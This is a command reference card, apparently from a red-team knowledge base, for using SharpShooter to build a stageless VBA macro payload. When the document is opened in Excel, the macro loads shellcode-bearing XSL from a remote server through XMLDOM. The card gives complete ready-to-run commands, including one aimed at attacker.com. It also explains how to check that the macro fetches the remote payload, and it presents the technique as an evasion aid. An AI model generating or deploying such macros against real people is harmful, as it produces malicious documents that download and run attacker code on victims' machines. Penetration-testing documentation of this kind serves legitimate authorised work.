---
type: command
executor: bash
data: >-
  python SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo
  --rawscfile ./x86payload.bin --com xslremote --awlurl
  http://192.168.2.8:8080/foo.xsl
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - payload-generation
  - vba-macro
  - xmldom
verified: true
validated: true
---

# SharpShooter Create VBA Macro with XMLDOM

## Command

```bash
python SharpShooter.py --stageless --dotnetver 2 --payload macro --output $_OUTPUT_FILE --rawscfile $_SHELLCODE_FILE --com xslremote --awlurl $_XSL_URL
```

## Description

Generates a stageless VBA macro payload using SharpShooter that leverages the XMLDOM COM interface to remotely load and execute an XSL stylesheet containing shellcode. This technique allows dynamic payload delivery from a web server, enhancing evasion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --stageless | Creates a single-stage payload without staging | Yes |
| --dotnetver 2 | Targets .NET Framework 2.0 for compatibility | Yes |
| --payload macro | Specifies VBA macro output format | Yes |
| --output $_OUTPUT_FILE | Base name for output (e.g., foo; generates foo.xlsm) | Yes |
| --rawscfile $_SHELLCODE_FILE | Path to raw shellcode (e.g., ./x86payload.bin) | Yes |
| --com xslremote | Uses XMLDOM for remote XSL loading | Yes |
| --awlurl $_XSL_URL | URL to hosted XSL file (e.g., http://192.168.2.8:8080/foo.xsl) | Yes |

## Examples

### Basic Usage

```bash
python SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

### With Local Server

```bash
python SharpShooter.py --stageless --dotnetver 2 --payload macro --output remote_macro --rawscfile shellcode.bin --com xslremote --awlurl http://attacker.com/payload.xsl
```

## Expected Output

Outputs a macro-enabled Excel file (e.g., foo.xlsm) with VBA code referencing XMLDOM. Console: "Generating VBA macro... Remote XSL configured." Success if no network errors during generation; test by opening in Excel and verifying HTTP request to $_XSL_URL upon macro run.

## Related

- [[procedures/xlm-excel-4-macro-sharpshooter-payload-creation]]
- [[tools/SharpShooter]]
